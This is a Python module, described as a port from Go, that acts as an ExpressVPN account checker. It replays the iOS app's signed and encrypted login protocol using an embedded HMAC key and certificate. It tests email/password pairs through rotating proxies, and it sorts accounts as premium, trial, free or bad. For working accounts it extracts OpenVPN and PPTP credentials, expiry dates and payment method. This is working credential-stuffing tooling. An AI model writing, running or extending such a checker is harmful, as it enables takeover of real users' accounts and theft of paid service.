"""
ExpressVPN Account Checker — Python port from Go
Performs credential validation, subscription lookup, and account classification.
"""

import os
import io
import gzip
import json
import hmac
import hashlib
import base64
import struct
import time
import secrets
from datetime import datetime, timezone

import requests

from cryptography.x509 import load_der_x509_certificate
from cryptography.hazmat.primitives.asymmetric.padding import PKCS1v15
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

# Use the non-deprecated TripleDES location if available
try:
    from cryptography.hazmat.decrepit.ciphers.algorithms import TripleDES
except ImportError:
    TripleDES = algorithms.TripleDES

# ─── Constants ────────────────────────────────────────────────────────────────

HMAC_KEY = b"@~y{T4]wfJMA},qG}06rDO{f0<kYEwYWX'K)-GOyB^exg;K_k-J7j%$)L@[2me3~"
CLIENT_VERSION = "11.5.2"
OS_NAME = "ios"
OS_VERSION = "14.4"
USER_AGENT_1 = "xvclient/v21.21.0 (ios; 14.4) ui/11.5.2"
USER_AGENT_2 = "xvclient/v21.21.0 (ios wiecz; 14.4) ui/11.5.2"
SIG_SUFFIX = "91c776e"
BASE_URL = "https://www.expressapisv2.net"

CERT_B64 = (
    "MIIDXTCCAkWgAwIBAgIJALPWYfHAoH+CMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNV"
    "BAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBX"
    "aWRnaXRzIFB0eSBMdGQwHhcNMTcxMTA5MDUwNTIzWhcNMjcxMTA3MDUwNTIzWjBF"
    "MQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50"
    "ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIB"
    "CgKCAQEAtUCqVSHRqQ5XnrnA4KEnGSLGRSHWgyOgpNzNjEUmjlO25Ojncaw0u+hH"
    "Ans8I3kNPk0qFlGP7oLeZvFH8+duDF02j4yVFDHkHRGyTBe3PsYvztDVzmddtG8e"
    "BgwJ88PocBXDjJvCojfkyQ8sY4EtK3y0UDJj4uJKckVdLUL8wFt2DPj+A3E4/KgY"
    "ELNXA3oUlNjFwr4kqpxeDjvTi3W4T02bhRXYXgDMgQgtLZMpf1zOpM2lfqRq6sFo"
    "OmzlBTv2qbvmcOSEz3ZamwFxoYDB86EfnKPCq6ZareO/1MWGHwxH24SoJhFmyOsv"
    "q/kPPa03GJnKtMUznTnBVhwWy7KJIwIDAQABo1AwTjAdBgNVHQ4EFgQUoKnoagA0"
    "CLOLTzDb2lQ/v/osUz0wHwYDVR0jBBgwFoAUoKnoagA0CLOLTzDb2lQ/v/osUz0w"
    "DAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAmF8BLuzF0rY2T2v2jTpC"
    "iqKxXARjalSjmDJLzDTWojrurHC5C/xVB8Hg+8USHPoM4V7Hr0zE4GYT5N5V+pJp"
    "/CUHppzzY9uYAJ1iXJpLXQyRD/SR4BaacMHUqakMjRbm3hwyi/pe4oQmyg66rZCl"
    "V6eBxEnFKofArNtdCZWGliRAy9P8krF8poSElJtvlYQ70vWiZVIU7kV6adMVFtmP"
    "q4stjog7c2Pu0EEylRlclWlD0r8YSuvA8XoMboYyfp+RiyixhqL1o2C1JJTjY4S/"
    "t+UvQq5xTsWun+PrDoEtupjto/0sRGnD9GB5Pe0J2+VGbx3ITPStNzOuxZ4BXLe7"
    "YA=="
)


# ─── DER / ASN.1 TLV builders ────────────────────────────────────────────────

def _der_length(n: int) -> bytes:
    """Encode a DER length field."""
    if n < 128:
        return bytes([n])
    elif n < 256:
        return bytes([0x81, n])
    elif n < 65536:
        return bytes([0x82, (n >> 8) & 0xFF, n & 0xFF])
    else:
        return bytes([0x83, (n >> 16) & 0xFF, (n >> 8) & 0xFF, n & 0xFF])


def build_tlv(cls: int, tag: int, compound: bool, content: bytes) -> bytes:
    """Build a DER TLV (Tag-Length-Value) element."""
    tag_byte = (cls << 6) | (tag & 0x1F)
    if compound:
        tag_byte |= 0x20
    return bytes([tag_byte]) + _der_length(len(content)) + content


def build_seq(content: bytes) -> bytes:
    return build_tlv(0, 16, True, content)


def build_set(content: bytes) -> bytes:
    return build_tlv(0, 17, True, content)


def build_octet(data: bytes) -> bytes:
    return build_tlv(0, 4, False, data)


def build_null() -> bytes:
    return b'\x05\x00'


def build_int(n: int) -> bytes:
    """DER-encode a small non-negative integer."""
    if n == 0:
        return b'\x02\x01\x00'
    # Encode as minimal big-endian bytes
    result = []
    val = n
    while val > 0:
        result.insert(0, val & 0xFF)
        val >>= 8
    # If high bit set, prepend 0x00 to keep it positive
    if result[0] & 0x80:
        result.insert(0, 0)
    content = bytes(result)
    return b'\x02' + _der_length(len(content)) + content


def build_big_int(n: int) -> bytes:
    """DER-encode a potentially large integer (e.g. certificate serial)."""
    if n == 0:
        return b'\x02\x01\x00'
    # Convert to big-endian bytes
    byte_len = (n.bit_length() + 7) // 8
    raw = n.to_bytes(byte_len, byteorder='big', signed=False)
    # If high bit set, prepend 0x00
    if raw[0] & 0x80:
        raw = b'\x00' + raw
    return b'\x02' + _der_length(len(raw)) + raw


def _encode_oid_component(value: int) -> bytes:
    """Encode a single OID component in base-128."""
    if value < 128:
        return bytes([value])
    result = []
    result.append(value & 0x7F)
    value >>= 7
    while value > 0:
        result.append((value & 0x7F) | 0x80)
        value >>= 7
    result.reverse()
    return bytes(result)


def build_oid(oid: list) -> bytes:
    """DER-encode an OID (Object Identifier)."""
    # First two components are encoded as 40*first + second
    content = _encode_oid_component(40 * oid[0] + oid[1])
    for comp in oid[2:]:
        content += _encode_oid_component(comp)
    return b'\x06' + _der_length(len(content)) + content


# ─── Crypto helpers ───────────────────────────────────────────────────────────

def generate_install_id() -> str:
    """Generate a random 64-char hex install ID."""
    return secrets.token_hex(32)


def compute_hmac(data: bytes) -> str:
    """Compute HMAC-SHA1 and return base64-encoded result."""
    mac = hmac.new(HMAC_KEY, data, hashlib.sha1)
    return base64.b64encode(mac.digest()).decode('ascii')


def gzip_compress(data: bytes) -> bytes:
    """Gzip-compress data."""
    buf = io.BytesIO()
    with gzip.GzipFile(fileobj=buf, mode='wb') as f:
        f.write(data)
    return buf.getvalue()


def pkcs7_pad(data: bytes, block_size: int) -> bytes:
    """PKCS7-pad data to the given block size."""
    pad_len = block_size - (len(data) % block_size)
    if pad_len == 0:
        pad_len = block_size
    return data + bytes([pad_len] * pad_len)


def pkcs7_unpad(data: bytes) -> bytes:
    """Remove PKCS7 padding."""
    if not data:
        raise ValueError("Empty data")
    pad = data[-1]
    if pad == 0 or pad > len(data):
        raise ValueError(f"Invalid padding: {pad}")
    return data[:-pad]


def aes_decrypt(data: bytes, key: bytes, iv: bytes) -> bytes:
    """AES-CBC decrypt with PKCS7 unpadding."""
    if len(data) == 0 or len(data) % 16 != 0:
        raise ValueError(f"Bad data length: {len(data)}")
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    decryptor = cipher.decryptor()
    plaintext = decryptor.update(data) + decryptor.finalize()
    return pkcs7_unpad(plaintext)


def envelope_encrypt(input_data: bytes, cert_der: bytes) -> bytes:
    """
    CMS/PKCS#7 EnvelopedData encryption:
    1. Parse X.509 cert, extract RSA public key
    2. Generate random 3DES key (24 bytes) and IV (8 bytes)
    3. PKCS7-pad input to 8-byte blocks
    4. Encrypt with 3DES-CBC
    5. RSA-PKCS1v15 encrypt the 3DES key
    6. Build DER-encoded CMS EnvelopedData ASN.1 structure
    """
    # Parse certificate
    cert = load_der_x509_certificate(cert_der)
    rsa_pub = cert.public_key()

    # Extract issuer raw DER and serial number for RecipientInfo
    issuer_raw = cert.issuer.public_bytes()  # raw DER of issuer Name
    serial_number = cert.serial_number

    # Generate content encryption key and IV
    content_key = secrets.token_bytes(24)  # 3DES key
    content_iv = secrets.token_bytes(8)    # 3DES IV

    # PKCS7-pad and encrypt with 3DES-CBC
    padded = pkcs7_pad(input_data, 8)
    cipher = Cipher(TripleDES(content_key), modes.CBC(content_iv))
    encryptor = cipher.encryptor()
    enc_content = encryptor.update(padded) + encryptor.finalize()

    # RSA-PKCS1v15 encrypt the content key
    enc_key = rsa_pub.encrypt(content_key, PKCS1v15())

    # ── Build ASN.1 DER structure ──

    # IssuerAndSerialNumber SEQUENCE { issuer, serialNumber }
    issuer_serial = build_seq(issuer_raw + build_big_int(serial_number))

    # AlgorithmIdentifier for RSA: OID 1.2.840.113549.1.1.1 + NULL
    rsa_alg_id = build_seq(
        build_oid([1, 2, 840, 113549, 1, 1, 1]) + build_null()
    )

    # KeyTransRecipientInfo (KTRI)
    ktri_body = build_int(0)                  # version
    ktri_body += issuer_serial                 # rid
    ktri_body += rsa_alg_id                    # keyEncryptionAlgorithm
    ktri_body += build_octet(enc_key)          # encryptedKey
    ktri_der = build_seq(ktri_body)

    # RecipientInfos SET
    recipient_infos = build_set(ktri_der)

    # AlgorithmIdentifier for 3DES-CBC: OID 1.2.840.113549.3.7 + IV
    des_alg_id = build_seq(
        build_oid([1, 2, 840, 113549, 3, 7]) + build_octet(content_iv)
    )

    # EncryptedContentInfo SEQUENCE
    eci_body = build_oid([1, 2, 840, 113549, 1, 7, 1])   # contentType (data)
    eci_body += des_alg_id                                  # contentEncryptionAlgorithm
    eci_body += build_tlv(2, 0, False, enc_content)         # [0] IMPLICIT encrypted content
    eci_der = build_seq(eci_body)

    # EnvelopedData SEQUENCE
    ev_body = build_int(0)           # version
    ev_body += recipient_infos       # recipientInfos
    ev_body += eci_der               # encryptedContentInfo
    ev_der = build_seq(ev_body)

    # ContentInfo SEQUENCE { contentType, [0] EXPLICIT content }
    ci_body = build_oid([1, 2, 840, 113549, 1, 7, 3])   # envelopedData OID
    ci_body += build_tlv(2, 0, True, ev_der)              # [0] EXPLICIT
    return build_seq(ci_body)


# ─── Main checker function ───────────────────────────────────────────────────

def check_expressvpn_account(
    email: str,
    password: str,
    use_proxy: bool = True,
    get_proxy_fn=None,
    save_history_fn=None,
) -> dict:
    if str(email).startswith("enc:") or str(password).startswith("enc:"):
        try:
            from modules.db import decrypt_credential
            if str(email).startswith("enc:"):
                dec = decrypt_credential(email)
                if ":" in dec:
                    email, password = dec.split(":", 1)
                else:
                    email = dec
            if str(password).startswith("enc:"):
                password = decrypt_credential(password)
        except Exception:
            pass
    """
    Check an ExpressVPN account and return its status and details.

    Returns a dict with keys:
        status: 'PREMIUM' | 'TRIAL' | 'FREE' | 'BAD' | 'ERROR'
        email, plan, expire_date, days_left, auto_renew, payment_method
        ovpn_username, ovpn_password, pptp_username, pptp_password
        route: proxy info string
        reason: error reason if failed
    """
    result = {
        'status': 'ERROR',
        'email': email,
        'plan': '',
        'expire_date': '',
        'days_left': 0,
        'auto_renew': '',
        'payment_method': '',
        'ovpn_username': '',
        'ovpn_password': '',
        'pptp_username': '',
        'pptp_password': '',
        'route': 'Direct',
        'reason': '',
    }

    # Proxy setup
    proxies = None
    if use_proxy and get_proxy_fn:
        try:
            proxy = get_proxy_fn()
            if proxy:
                result['route'] = proxy
                proxies = {'http': proxy, 'https': proxy}
        except Exception:
            pass

    try:
        # Decode certificate
        cert_der = base64.b64decode(CERT_B64)

        # Generate random values
        install_id = generate_install_id()
        aes_key = secrets.token_bytes(16)
        aes_iv = secrets.token_bytes(16)

        # Build JSON payload (keys sorted alphabetically like Go's json.Marshal)
        payload = json.dumps({
            'email': email,
            'iv': base64.b64encode(aes_iv).decode('ascii'),
            'key': base64.b64encode(aes_key).decode('ascii'),
            'password': password,
        }, separators=(',', ':'), sort_keys=True).encode('utf-8')

        # Gzip compress
        gzipped = gzip_compress(payload)

        # Envelope encrypt
        encrypted = envelope_encrypt(gzipped, cert_der)

        # Build request URL and signatures
        query = (
            f"client_version={CLIENT_VERSION}"
            f"&installation_id={install_id}"
            f"&os_name={OS_NAME}"
            f"&os_version={OS_VERSION}"
        )
        header_raw = f"POST /apis/v2/credentials?{query}"
        url1 = f"{BASE_URL}/apis/v2/credentials?{query}"

        h_sig = compute_hmac(header_raw.encode('utf-8'))
        b_sig = compute_hmac(encrypted)

        # First request — credentials
        headers1 = {
            'User-Agent': USER_AGENT_1,
            'Content-Type': 'application/octet-stream',
            'X-Body-Compression': 'gzip',
            'X-Signature': f'2 {h_sig} {SIG_SUFFIX}',
            'X-Body-Signature': f'2 {b_sig} {SIG_SUFFIX}',
            'Accept-Language': 'en',
            'Expect': '',
        }

        session = requests.Session()
        resp1 = session.post(
            url1,
            data=encrypted,
            headers=headers1,
            proxies=proxies,
            timeout=30,
            verify=True,
        )

        if resp1.status_code == 429:
            result['status'] = 'ERROR'
            result['reason'] = 'rate_limited'
            return result
        if resp1.status_code == 401:
            result['status'] = 'BAD'
            result['reason'] = 'invalid_credentials'
            return result
        if resp1.status_code != 200:
            result['status'] = 'BAD'
            result['reason'] = f'http_{resp1.status_code}'
            return result

        # Decrypt response with AES-CBC
        try:
            decrypted = aes_decrypt(resp1.content, aes_key, aes_iv)
        except Exception as e:
            result['status'] = 'ERROR'
            result['reason'] = f'decrypt_failed: {e}'
            return result

        try:
            resp_json = json.loads(decrypted)
        except json.JSONDecodeError as e:
            result['status'] = 'ERROR'
            result['reason'] = f'json_parse_failed: {e}'
            return result

        # Extract VPN credentials
        result['ovpn_username'] = resp_json.get('ovpn_username', '')
        result['ovpn_password'] = resp_json.get('ovpn_password', '')
        result['pptp_username'] = resp_json.get('pptp_username', '')
        result['pptp_password'] = resp_json.get('pptp_password', '')

        access_token = resp_json.get('access_token', '')
        if not access_token:
            result['status'] = 'BAD'
            result['reason'] = 'no_access_token'
            return result

        # ── Second request — subscription info via batch endpoint ──

        sub_query = (
            f"access_token={access_token}"
            f"&client_version={CLIENT_VERSION}"
            f"&installation_id={install_id}"
            f"&os_name={OS_NAME}"
            f"&os_version={OS_VERSION}"
            f"&reason=activation_with_email"
        )
        sub_raw = f"GET /apis/v2/subscription?{sub_query}"
        sub_h_sig = compute_hmac(sub_raw.encode('utf-8'))

        batch_query = (
            f"client_version={CLIENT_VERSION}"
            f"&installation_id={install_id}"
            f"&os_name={OS_NAME}"
            f"&os_version={OS_VERSION}"
        )
        batch_raw = f"POST /apis/v2/batch?{batch_query}"
        batch_sig = compute_hmac(batch_raw.encode('utf-8'))
        batch_url = f"{BASE_URL}/apis/v2/batch?{batch_query}"

        # Build batch body — JSON array with one entry
        batch_body_obj = [{
            'headers': {
                'Accept-Language': 'en',
                'X-Signature': f'2 {sub_h_sig} {SIG_SUFFIX}',
            },
            'method': 'GET',
            'url': f'/apis/v2/subscription?{sub_query}',
        }]
        batch_body = json.dumps(batch_body_obj, separators=(',', ':')).encode('utf-8')

        cap_sig = compute_hmac(batch_body)

        headers2 = {
            'User-Agent': USER_AGENT_2,
            'X-Body-Compression': 'gzip',
            'X-Signature': f'2 {batch_sig} {SIG_SUFFIX}',
            'X-Body-Signature': f'2 {cap_sig} {SIG_SUFFIX}',
            'Accept-Language': 'en',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/json',
        }

        resp2 = session.post(
            batch_url,
            data=batch_body,
            headers=headers2,
            proxies=proxies,
            timeout=30,
            verify=True,
        )

        if resp2.status_code == 429:
            result['status'] = 'ERROR'
            result['reason'] = 'rate_limited'
            return result

        # Handle gzip response (requests usually auto-decompresses, but handle manually)
        body2 = resp2.content
        if resp2.headers.get('Content-Encoding', '').lower() == 'gzip':
            try:
                body2 = gzip.decompress(body2)
            except Exception:
                pass  # Already decompressed by requests

        try:
            batch_data = json.loads(body2)
        except json.JSONDecodeError:
            result['status'] = 'ERROR'
            result['reason'] = 'batch_json_parse_failed'
            return result

        if not isinstance(batch_data, list) or len(batch_data) == 0:
            result['status'] = 'ERROR'
            result['reason'] = 'empty_batch_response'
            return result

        first = batch_data[0]

        # Check for rate limiting in batch response
        if first.get('code') == 429 or first.get('status') == 429:
            result['status'] = 'ERROR'
            result['reason'] = 'rate_limited'
            return result

        sub_body_raw = first.get('body', '')
        if not sub_body_raw:
            result['status'] = 'ERROR'
            result['reason'] = 'no_subscription_body'
            return result

        # The body may have escaped quotes
        if isinstance(sub_body_raw, str):
            sub_body_raw = sub_body_raw.replace('\\"', '"')

        try:
            sub_json = json.loads(sub_body_raw) if isinstance(sub_body_raw, str) else sub_body_raw
        except json.JSONDecodeError:
            result['status'] = 'ERROR'
            result['reason'] = 'sub_json_parse_failed'
            return result

        # Unwrap "subscription" key if present
        if 'subscription' in sub_json and isinstance(sub_json['subscription'], dict):
            sub_json = sub_json['subscription']

        license_status = str(sub_json.get('license_status', '')).upper()

        # Extract subscription details
        billing_cycle = sub_json.get('billing_cycle')
        if billing_cycle is not None:
            try:
                result['plan'] = f"{int(billing_cycle)} Month"
            except (ValueError, TypeError):
                result['plan'] = str(billing_cycle)

        expiration_time = sub_json.get('expiration_time')
        if expiration_time is not None:
            try:
                exp_ts = float(expiration_time)
                exp_dt = datetime.fromtimestamp(exp_ts, tz=timezone.utc)
                result['expire_date'] = exp_dt.strftime('%Y-%m-%d')
                result['days_left'] = int((exp_ts - time.time()) / 86400)
            except (ValueError, TypeError, OSError):
                pass

        auto_bill = sub_json.get('auto_bill')
        if auto_bill is not None:
            result['auto_renew'] = str(auto_bill).lower()

        payment_method = sub_json.get('payment_method')
        if payment_method is not None:
            result['payment_method'] = str(payment_method)

        # ── Classify account status ──

        now_ts = time.time()
        exp_ts_val = None
        if expiration_time is not None:
            try:
                exp_ts_val = float(expiration_time)
            except (ValueError, TypeError):
                pass

        if license_status == 'REVOKED':
            result['status'] = 'FREE'
            return result

        if license_status == 'TRIAL':
            if exp_ts_val is not None and now_ts < exp_ts_val:
                result['status'] = 'TRIAL'
                return result

        if license_status in ('ACTIVE', 'PAID'):
            if exp_ts_val is not None and now_ts < exp_ts_val:
                result['status'] = 'PREMIUM'
                return result

        # Expired or unknown status
        if exp_ts_val is not None and now_ts >= exp_ts_val:
            result['status'] = 'FREE'
            result['reason'] = 'expired'
        else:
            result['status'] = 'BAD'
            result['reason'] = f'unknown_license_status: {license_status}'

        return result

    except requests.exceptions.Timeout:
        result['status'] = 'ERROR'
        result['reason'] = 'timeout'
        return result
    except requests.exceptions.ConnectionError as e:
        result['status'] = 'ERROR'
        result['reason'] = f'connection_error: {e}'
        return result
    except Exception as e:
        result['status'] = 'ERROR'
        result['reason'] = f'exception: {type(e).__name__}: {e}'
        return result


# ─── Quick self-test on import ────────────────────────────────────────────────

if __name__ == '__main__':
    print("ExpressVPN checker module loaded OK")
    # Verify envelope_encrypt works with the cert
    cert_der = base64.b64decode(CERT_B64)
    test_data = b'hello world test'
    enc = envelope_encrypt(test_data, cert_der)
    print(f"Envelope encrypt test: {len(enc)} bytes DER output — OK")
    print(f"Install ID sample: {generate_install_id()}")
    print(f"HMAC test: {compute_hmac(b'test')}")
